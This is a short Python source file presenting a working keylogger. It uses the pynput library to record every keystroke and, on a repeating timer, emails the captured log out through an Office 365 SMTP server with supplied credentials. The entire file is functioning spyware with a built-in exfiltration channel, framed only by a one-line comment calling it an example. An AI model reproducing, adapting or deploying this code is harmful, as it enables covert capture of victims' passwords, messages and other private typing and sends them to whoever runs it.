#!/usr/bin/env python
# This script is an example of a keylogger

import pynput.keyboard # This library allows to monitor mouse clicks and keyboard strokes.
import threading
import smtplib


class Keylogger:

    def __init__(self, interval, email, password):
        self.log = "Keylogger started"
        self.interval = interval
        self.email = email
        self.password = password

    def append_to_key(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_key(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.office365.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        try:
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
        except KeyboardInterrupt:
            print("\nExiting program")
